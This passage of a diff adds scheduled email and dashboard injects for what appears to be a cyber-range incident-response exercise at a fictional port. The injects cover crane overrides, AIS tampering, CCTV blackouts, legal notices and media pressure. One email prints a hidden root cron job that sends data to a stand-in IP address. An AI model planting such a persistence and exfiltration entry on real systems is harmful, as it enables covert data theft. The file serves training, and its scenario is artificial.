+        "body": "Morning team,\n\nWhile updating the Policy Binder I discovered our \"Maritime OPS Cyber Contingency\" document expired three months ago. Section 4.3 mandates annual board sign-off, which hasn't occurred.\n\nCan you advise if an interim waiver is possible, or do we need emergency board approval? I've attached the lapsed version with my annotations.\n\nRegards,\nPriya"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 85,
+    "event_id": "P4-1-EMAIL20",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Frank Cossar (Dock Supervisor)",
+        "subject": "CCTV Blind Zone – West Perimeter Safety Concern",
+        "to": ["ops@simrange.local"],
+        "body": "Ops,\n\nCamera 17 has been black for the last six minutes, giving us a complete blind spot on the west gate. Forklift traffic is picking up and I've already had one near-miss report.\n\nPlease confirm if we're authorising a temporary halt for lanes 3-4 or deploying spotters. I'll hold crews until I hear back.\n\n— Frank"
+      }
+    },
+    "manual": false
+  },
+  {
+    "_comment": "========== PHASE 4-2 (T+87 to T+90) =========="
+  },
+  {
+    "time_offset": 87,
+    "event_id": "P4-2-EMAIL4",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Ops Safety Console (alerts@ops.local)",
+        "subject": "STOP ORDER? Crane-07 executed uncommanded drop at 10:02",
+        "to": ["ops@simrange.local", "tech@simrange.local", "executive@simrange.local"],
+        "body": "**ALERT ID:** C07-OVR-ERR-043\n**Timestamp:** 10:02:17\n**Description:** PLC register 0x2A received external override while operator pendant idle. Load dropped 0.7 m – safety interlocks caught descent; no injury.\n\n**Immediate decisions required:**\n*OPS* – do we suspend Crane-07 and adjacent berths?\n*TECH* – confirm whether this aligns with the scheduler cron job you're dissecting (see message 10:05).\n*EXEC* – if suspension exceeds 30 min we'll breach the Maersk SLA – need direction.\n\nSystem remains powered but in manual inhibit. Reply *ACK* once action taken.\n\n— Safety Console"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 87,
+    "event_id": "P4-2-EMAIL5",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Maya Singh (Audit Analyst)",
+        "subject": "Scheduler VM – persistent cron entry creating network beacons",
+        "to": ["tech@simrange.local", "legal@simrange.local", "incident@simrange.local"],
+        "body": "While parsing */etc/cron.d/* on *vm-scheduler* I located **cron.backup-old** executing every 90 sec:\n\n```\n* * * * * root /usr/local/bin/.sync --dest 198.51.100.17 --compress >> /var/log/.shadow 2>&1\n```\n\nFirst entry 09:31 (pre-isolation); last run 10:04. Log file contents appear base64-encoded.\n\nThis looks like data exfil rather than backup. Recommend **immediate isolation** of scheduler network interface to retain forensic copy, *not* blanket kill – Legal will need intent evidence.\n\nPlease advise on containment so I can snapshot the VM while disk state is intact.\n\n— Maya"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 88,
+    "event_id": "P4-2-EMAIL6",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Frank Cossar (Dockmaster)",
+        "subject": "Crane team unsure if system safe – need single source of truth",
+        "to": ["ops@simrange.local", "tech@simrange.local"],
+        "body": "Folks,\n\nGround crew are asking three different supervisors whether Crane-07 is \"safe\". We've told them to hold clear, but rumours of the override are already spreading. If tech is patching, I need you on the VHF to brief team leaders in plain language *now*, not after another slack thread.\n\nAction items:\n\n1. Ops: confirm operational status – green, amber, or red.\n2. Tech: 60-second bulletin explaining what happened and next protective step.\n3. Copy me so I can push a unified radio message.\n\nMorale is fraying – clarity trumps perfection.\n\n– Frank"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 89,
+    "event_id": "P4-2-EMAIL7",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Alex Yeung (Legal Intern)",
+        "subject": "Does cron job equal \"persistence\" under Cybersecurity Act §5(b)?",
+        "to": ["legal@simrange.local"],
+        "body": "Team,\n\nScanning §5(b) of the Act – \"any mechanism establishing unauthorised *ongoing* control\" triggers mandatory regulator notice within four hours. The scheduler cron job looks continuous. Do we therefore hit the threshold?\n\nI'm drafting the comparison table for the breach pack. Need your steer before I escalate to Senior Counsel.\n\nAlex"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 89,
+    "event_id": "P4-2-EMAIL21",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Harjit Mann (Tech Support Analyst)",
+        "subject": "Heads-Up: Isolating Node-04 Will Drop CCTV Relays",
+        "to": ["tech@simrange.local"],
+        "body": "Team,\n\nIf we quarantine Node-04 to chase the packet queue spike, be aware it handles the multicast push for four CCTV encoders (cams 15-18). That will knock out perimeter visibility unless Ops has a fallback.\n\nLet me know the plan so I can prep comms to the dockside team.\n\nHarjit"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 90,
+    "event_id": "P4-2-EMAIL22",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Operations Control",
+        "subject": "AIS Disappearance of Ship_Alpha – Verification Needed ASAP",
+        "to": ["tech@simrange.local"],
+        "body": "Tech,\n\nOur visual check confirms Ship_Alpha is approaching but still doesn't appear on AIS. Please verify whether this is a feed glitch or something bigger. If it's systemic we'll need manual pilotage procedures — decision cut-off in 15 minutes.\n\nOC Desk"
+      }
+    },
+    "manual": false
+  },
+  {
+    "_comment": "========== PHASE 4-3 (T+92 to T+95) =========="
+  },
+  {
+    "time_offset": 92,
+    "event_id": "P4-3-EMAIL8",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Physical Security System (access-control@security.local)",
+        "subject": "ALERT: Terminal Control Room access denied – badge ID 1478 (revoked)",
+        "to": ["ops@simrange.local", "tech@simrange.local", "incident@simrange.local"],
+        "body": "Access panel registered failed entry at **10:12:44**. Badge 1478 belongs to former contractor *Paul Ricci* – decommissioned two months ago. CCTV inside the vestibule is currently offline (camera02 feed issue).\n\nOPS – lockdown protocol step 3 requires manual patrol confirmation within 5 min.\nTECH – can you re-route a spare feed to vestibule-cam?\nCOORD – log reference AC-10-12 and flag to Legal for potential breach escalation.\n\n— ACS-9000"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 92,
+    "event_id": "P4-3-EMAIL9",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Maria Gonzalez (Senior Counsel)",
+        "subject": "[Draft] Breach Notification – Regulatory & Affected Stakeholders",
+        "to": ["ceo@simrange.local", "executive@simrange.local", "legal@simrange.local", "media@simrange.local"],
+        "body": "Attached is the full draft of our breach notification (12 pages):\n\n* Section 1 – Incident chronology (validated to 10:05)\n* Section 2 – Data categories exposed (preliminary)\n* Section 3 – Immediate containment actions\n* Section 4 – Commitments to stakeholders\n\n*Review deadline: **10:35*** to meet the statutory four-hour clock. Please mark any redlines inline; I have compliance counsel on standby for final sign-off.\n\nMedia Lead – page 10 contains proposed public wording; ensure tone aligns with CEO talking points.\nCEO – signature block is page 11; we can insert e-signature if travel prevents wet ink.\n\nRegards,\nMaria"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 93,
+    "event_id": "P4-3-EMAIL10",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "David Lam (Regulatory Counsel)",
+        "subject": "Case precedence for mixed physical-cyber incidents",
+        "to": ["legal@simrange.local"],
+        "body": "Team,\n\nFor section 2.3 of the breach notice, I recommend citing *Port Sunrise v Bond Insurance (2023)* – arbitration found that intermittent system overrides *did* constitute a \"material cyber event\" even where physical failsafes prevented injury. Attaching summary PDF.\n\nLet me know if other cases spring to mind – we have 20 minutes.\n\n— David"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 93,
+    "event_id": "P4-3-EMAIL11",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "PulseWatch Bot (social@pulsewatch.ai)",
+        "subject": "🔴 Trending: \"Southgate misroutes containers AGAIN\"",
+        "to": ["media@simrange.local", "executive@simrange.local"],
+        "body": "The hashtag **#SouthgateShutdown** is now top-5 in the region with ~12 k tweets/min. Source tweet claims fresh misrouting at 10:10. No mainstream pick-up yet, but momentum doubling every 4 min.\n\nRecommendation: issue holding line within **15 min** or risk narrative hardening.\n\nDashboard: https://pulsewatch.ai/southgate/live (internal only)\n\n— PulseWatch"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 93,
+    "event_id": "P4-3-EMAIL12",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Jamie Fisher (ABC News)",
+        "subject": "FINAL CALL – on-camera comment needed within 30 min",
+        "to": ["media@simrange.local", "ceo@simrange.local"],
+        "body": "We are broadcasting live from your main gate at **10:45**. Viewers will expect a statement on today's disruptions, especially reports of manual crane overrides.\n\nIf your CEO is unavailable, please nominate an authorised spokesperson. Silence will be noted on air.\n\nRegards,\nJamie Fisher"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 94,
+    "event_id": "P4-3-EMAIL13",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Elena Kaur (Incident Coordinator)",
+        "subject": "T+110 checkpoint – tag all deviations before export",
+        "to": ["ops@simrange.local", "tech@simrange.local", "legal@simrange.local", "media@simrange.local", "executive@simrange.local"],
+        "body": "Quick pulse-check: every team must tag *any* deviation from SOP or timeline before final export. If it's not in the log, it never happened – and Legal cannot defend it.\n\nUpload location: */incident/share/deviations/* – filename convention `Team_Phase_ShortDesc.txt`.\n\nDeadline **10:25** for compilation into ministerial brief.\n\nThanks,\nElena"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 94,
+    "event_id": "P4-3-EMAIL14",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Jonathan Reeves (Chief of Staff)",
+        "subject": "End-of-day briefing log required for 12:00 ministerial slot",
+        "to": ["incident@simrange.local", "executive@simrange.local", "legal@simrange.local"],
+        "body": "The Infrastructure Minister's office has locked a briefing for **12:00**. They expect a concise timeline of *what happened, who acted, and when*.\n\nIC – please provide the consolidated log in PDF by **11:15** so the CEO can absorb before we walk into that room.\nLegal – append any disclaimers you deem essential.\nExec – have spokes lines ready; Minister will probe insurer status.\n\nLet's keep surprises to zero.\n\nJonathan"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 94,
+    "event_id": "P4-3-EMAIL15",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Angela Poole (External Affairs)",
+        "subject": "Strongly recommend holding final statement until CEO fully briefed",
+        "to": ["media@simrange.local", "executive@simrange.local"],
+        "body": "Given the insurer status is still in flux and the ministerial briefing is imminent, releasing a public wrap-up now risks contradiction inside an hour.\n\nI suggest we prepare the statement, *timestamp it*, but embargo until post-brief. If media push, we can issue a one-line \"update forthcoming\" notice.\n\nPlease confirm alignment.\n\nAngela"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 95,
+    "event_id": "P4-3-EMAIL16",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Sophie Turner (Policy Advisor)",
+        "subject": "Relevance of Port Sunrise precedent to *digital-only* breaches",
+        "to": ["legal@simrange.local"],
+        "body": "Team,\n\nQuick note: Port Sunrise dealt with hybrid OT failures; our incident may skew more toward pure data exfil + limited OT impact. Regulators could argue the precedent is *not* a direct match.\n\nRecommend adding *Pacific Rail v Delta Cyber (2022)* as dual-citation to bolster linkage.\n\n— Sophie"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 95,
+    "event_id": "P4-3-EMAIL17",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Department of Infrastructure (incident-reports@infrastructure.gov.au)",
+        "subject": "Formal request: full incident report & decision register (Ref: DI-2025-06-SG)",
+        "to": ["ceo@simrange.local", "executive@simrange.local", "incident@simrange.local", "legal@simrange.local"],
+        "body": "Under Section 18 of the Maritime Infrastructure Security Act, the Department requires your organisation to submit a comprehensive incident report covering:\n\n1. Technical chronology and root-cause analysis\n2. Safety and operational impact assessment\n3. Decision register including timestamped approvals\n4. Remediation roadmap and timelines\n\nDeadline for electronic submission is **17:00 AEST today**. Failure to comply may result in a provisional enforcement notice.\n\nPlease acknowledge receipt of this request within one hour and provide a contact for follow-up queries.\n\nRegards,\nMonique Hawkins\nAssistant Secretary – Critical Infrastructure Response"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 95,
+    "event_id": "P4-3-EMAIL23",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Michael Carter (Night-Shift Dock Supervisor)",
+        "subject": "Request to Halt Night Operations – Safety & Morale",
+        "to": ["ops@simrange.local", "executive@simrange.local"],
+        "body": "Leadership,\n\nFatigue levels are spiking. With containers mis-routed and several cranes still on manual, I have three crew threatening to walk. Unless we resolve visibility and routing issues in the next hour I'll need written authorisation to suspend the midnight shift.\n\nPlease advise on authority and communications plan with stevedores.\n\n— Mike"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 95,
+    "event_id": "P4-3-EMAIL24",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Elise Holland (PA to CEO)",
+        "subject": "Media Crew Waiting Outside HQ – Guidance Needed",
+        "to": ["executive@simrange.local", "media@simrange.local"],
+        "body": "Team,\n\nABC's camera crew and journalist Jamie Fisher are now outside reception asking for a five-minute doorstep grab with the CEO. Security is stalling but won't hold them much longer.\n\nDo we (a) bring them into the briefing room for a controlled statement, (b) issue a printed holding line, or (c) decline and risk live shots of a closed door?\n\nNeed a decision within ten.\n\nElise"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 95,
+    "event_id": "P4-3-EMAIL25",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Dr Sam Yates (Policy Advisor)",
+        "subject": "Relevance of Shared Precedent to Digital Breach",
+        "to": ["legal@simrange.local"],
+        "body": "Team,\n\nThe precedent circulated (ACCC v Harbour Freight 2021) dealt with physical cargo damage, not data integrity. I'm not convinced it supports our current cyber posture. Can someone clarify exactly which clauses you intend to cite in the breach notice?\n\nIf mis-applied we risk regulator push-back. Please advise before the draft goes to Exec.\n\nSam"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 95,
+    "event_id": "P4-3-EMAIL26",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Jordan Lee (Incident Coordinator)",
+        "subject": "ACTION: Tag All Deviations & Prepare Logs for Export",
+        "to": ["ops@simrange.local", "tech@simrange.local", "legal@simrange.local", "media@simrange.local", "executive@simrange.local"],
+        "body": "Colleagues,\n\nReminder that the ministerial request (INJ013T) requires a fully tagged incident timeline. Please:\n\n1. Ensure every major decision and deviation is logged with timestamp & policy reference.\n2. Push final logs (tech, ops, gateway) to vm-audit by 17:30.\n3. Confirm in Slack once complete so I can freeze the master record.\n\nFailure to tag will compromise the final score — let's finish strong.\n\nJordan"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 95,
+    "event_id": "MEDIA-T75-NEWS",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "media",
+        "change": "publish_news",
+        "headline": "BREAKING: Sabotage at Southgate? Port operations in chaos as systems fail",
+        "source": "ABC News",
+        "media_id": "2"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 105,
+    "event_id": "MEDIA-T105-UNREST",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "media",
+        "change": "publish_news",
+        "headline": "BREAKING: Unrest Reported at Southgate Port - Workers demand answers",
+        "source": "Channel 7",
+        "media_id": "3"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 100,
+    "event_id": "MEDIA-T110-INTERVIEW",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "media",
+        "change": "air_interview",
+        "interviewee": "CEO",
+        "title": "CEO Interview on Southgate Incident",
+        "source": "Channel 7",
+        "media_id": "4"
+      }
+    },
+    "manual": false
+  },
+  {
+    "_comment": "========== TECHNICAL DASHBOARD ALERTS =========="
+  },
+  {
+    "_comment": "========== PHASE 1 (T+0 to T+20) =========="
+  },
+  {
+    "time_offset": 5,
+    "event_id": "TECH-P1-AIS1",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "ais",
+        "change": "hide_ship",
+        "target_ships": ["Ship_Alpha"]
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 10,
+    "event_id": "TECH-P1-AIS2",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "ais",
+        "change": "hide_ship",
+        "target_ships": ["Ship_Bravo"]
+      }
+    },
+    "manual": false
+  },
+  {
+    "_comment": "========== PHASE 2 (T+20 to T+50) =========="
+  },
+  {
+    "time_offset": 20,
+    "event_id": "TECH-P2-CCTV1",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "cctv",
+        "change": "trigger_blackout"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 25,
+    "event_id": "TECH-P2-VENDOR1",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "logs",
+        "change": "log_auth_failure",
+        "source": "vm-gateway",
+        "user": "root",
+        "message": "Multiple failed root login attempts from 198.51.100.17"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 28,
+    "event_id": "TECH-P2-VENDOR1B",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "logs",
+        "change": "log_auth_success",
+        "source": "vm-gateway",
+        "user": "ghost",
+        "message": "Unauthorized user 'ghost' successfully authenticated"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 30,
+    "event_id": "TECH-P2-VENDOR2",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "vendor",
+        "change": "access_log",
+        "user": "unknown_vendor_account",
+        "ip": "192.168.1.100",
+        "status": "Failed",
+        "message": "Unauthorized vendor access attempt during incident response"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 30,
+    "event_id": "TECH-P2-CCTV2",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "cctv",
+        "change": "stream_failure",
+        "berths": [4, 5, 7],
+        "message": "CCTV streams failing for berths 4, 5, 7 - camera feeds lost"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 32,
+    "event_id": "TECH-P2-CCTV3",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "logs",
+        "change": "system_alert",
+        "source": "vm-opsnode",
+        "message": "RF interference pattern detected on CCTV frequencies"
+      }
+    },
+    "manual": false
+  },
+  {
+    "_comment": "========== PHASE 3 (T+50 to T+80) =========="
+  },
+  {
+    "time_offset": 40,
+    "event_id": "TECH-P3-AIS3",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "ais",
+        "change": "hide_all_ships"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 40,
+    "event_id": "TECH-P3-LOGS1",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "logs",
+        "change": "unauthorised_access",
+        "source": "vm-gateway",
+        "ip": "198.51.100.17"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 40,
+    "event_id": "TECH-P3-LOGS2",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "logs",
+        "change": "log_auth_failure",
+        "source": "vm-coretech",
+        "user": "svc_scheduler"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 40,
+    "event_id": "TECH-P3-LOGS2B",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "logs",
+        "change": "log_auth_failure",
+        "source": "vm-coretech",
+        "user": "svc_ais"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 42,
+    "event_id": "TECH-P3-LOGS3",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "logs",
+        "change": "cronjob_detected",
+        "source": "vm-coretech",
+        "task": "/etc/cron.d/ais-maintenance"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 45,
+    "event_id": "TECH-P3-AIS4",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "logs",
+        "change": "system_alert",
+        "source": "vm-coretech",
+        "message": "AIS configuration tampering detected - filter coordinates modified"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 50,
+    "event_id": "TECH-P3-CONTAINER1",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "container",
+        "change": "log_config_manipulation"
+      }
+    },
+    "manual": false
+  },
+  {
+    "_comment": "========== PHASE 4 (T+80 to T+110) =========="
+  },
+  {
+    "time_offset": 60,
+    "event_id": "TECH-P4-LOGS4",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "logs",
+        "change": "log_deletion_alert",
+        "user": "svc_admin",
+        "file": "/var/log/auth.log"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 60,
+    "event_id": "TECH-P4-LOGS5",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "logs",
+        "change": "cronjob_detected",
+        "source": "vm-gateway",
+        "task": "/etc/cron.d/vendor-sync"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 70,
+    "event_id": "TECH-P4-LOGS6",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "logs",
+        "change": "cronjob_detected",
+        "source": "vm-opsnode",
+        "task": "/etc/cron.d/cctv-maintenance"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 72,
+    "event_id": "TECH-P4-CCTV4",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "logs",
+        "change": "system_alert",
+        "source": "vm-opsnode",
+        "message": "Service account svc_cctv executing disruption tools"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 73,
+    "event_id": "TECH-P4-CCTV5",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "logs",
+        "change": "system_alert",
+        "source": "vm-opsnode",
+        "message": "Media archive corruption detected - camera recordings damaged"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 74,
+    "event_id": "TECH-P4-VENDOR3",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "logs",
+        "change": "system_alert",
+        "source": "vm-gateway",
+        "message": "Vendor session detected with elevated privileges - unauthorized changes made"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 4,
+    "event_id": "N-INJ002C",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Dock Supervisor",
+        "subject": "New Coffee Machine for Berth 3?",
+        "to": ["ops@simrange.local"],
+        "body": "Hi Ops,\n\nJust flagging that the coffee machine in the Berth 3 control hut is leaking again. We’ve tried cleaning out the seals, but it’s still shorting out intermittently. Crew morale is already tense today and a functioning coffee machine could genuinely help.\n\nCould we fast-track a replacement request through Facilities? It doesn’t have to be fancy.\n\nCheers,\nIan"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 8,
+    "event_id": "N-INJ003D",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "IT Support",
+        "subject": "Password Rotation Reminder for Group Admins",
+        "to": ["tech@simrange.local"],
+        "body": "Hi all,\n\nJust a reminder that admin-level credentials on group servers are scheduled for rotation by the end of the week.\n\nThis includes:\n- SYSADM-CORE\n- DOCKER-CONTROL\n- EMAIL_BACKUP\n\nPlease avoid late changes or password clashes. Submit updated hashes to the credentials vault and confirm via Slack when done.\n\n– IT Support"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 9,
+    "event_id": "N-INJ003E",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "HR",
+        "subject": "Staff Leave Report is Broken Again… Anyone Else?",
+        "to": ["ceo@simrange.local", "legal@simrange.local"],
+        "body": "Hey team,\n\nJust checking if anyone else is having trouble with the staff leave reporting tool? Trying to approve a shift trade, but the dropdowns are blank and the export report crashed again.\n\nIT said it was fixed last month, but clearly not. If you’ve got a workaround, let me know.\n\nThanks,\nEmma – HR Ops"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 31,
+    "event_id": "N-INJ004D",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "HR – People & Culture",
+        "subject": "Wellbeing Check-In Reminder",
+        "to": ["legal@simrange.local", "ceo@simrange.local"],
+        "body": "Hi leaders,\n\nWith a busy week and teams under pressure, we’d like to remind everyone to complete the Q2 wellbeing check-in.\n\nIt takes under 3 minutes and provides a quick pulse on team morale and individual stress factors. Leadership participation is important to set the tone.\n\nThanks for your support,\nSarah – HR Lead"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 32,
+    "event_id": "N-INJ004F",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Port Wellness",
+        "subject": "Hot Day – Hydrate!",
+        "to": [
+          "media@simrange.local",
+          "legal@simrange.local",
+          "tech@psimrange.local",
+          "ceo@simrange.local",
+          "ops@simrange.local",
+          "incident@simrange.local"
+        ],
+        "body": "Good afternoon all,\n\nTemperatures across Southgate are expected to peak at 37°C this afternoon. Please remind your teams to:\n- Stay hydrated (water, not just coffee!)\n- Use shaded areas during breaks\n- Report any heat stress symptoms immediately\n\nStay safe out there.\n\n– Port Wellness Coordinator"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 34,
+    "event_id": "N-INJ005F",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Social Committee",
+        "subject": "Friday Coffee Club Cancelled",
+        "to": ["ops@simrange.local"],
+        "body": "Hi Ops,\n\nUnfortunately, due to the current operational tempo and cross-shift coverage demands, we’re cancelling this Friday’s coffee club meetup.\n\nWe’ll reschedule for next week when things settle. If your team wants to coordinate a mini-morning tea independently, feel free to use the boardroom slot.\n\nCheers,\nTash"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 35,
+    "event_id": "N-INJ005G",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Site Operations",
+        "subject": "New Parking Policy (Effective Monday)",
+        "to": [
+          "media@simrange.local",
+          "legal@simrange.local",
+          "tech@simrange.local",
+          "ceo@simrange.local",
+          "ops@simrange.local",
+          "incident@simrange.local"
+        ],
+        "body": "Good morning,\n\nThis is a final reminder that the updated parking zone allocations will take effect from Monday. This includes:\n- Electric vehicle priority spaces in Zone D\n- Contractor overflow moved to West Gate\n- Loading bay access hours strictly enforced\n\nFull map is available on the staff portal. Ticketing will resume at 0600 sharp. Please pass this to your teams.\n\nThanks,\nFacilities & Site Ops"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 37,
+    "event_id": "N-INJ006E",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Logistics Desk",
+        "subject": "Did We Install That New Video Wall?",
+        "to": ["ceo@simrange.local", "media@simrange.local"],
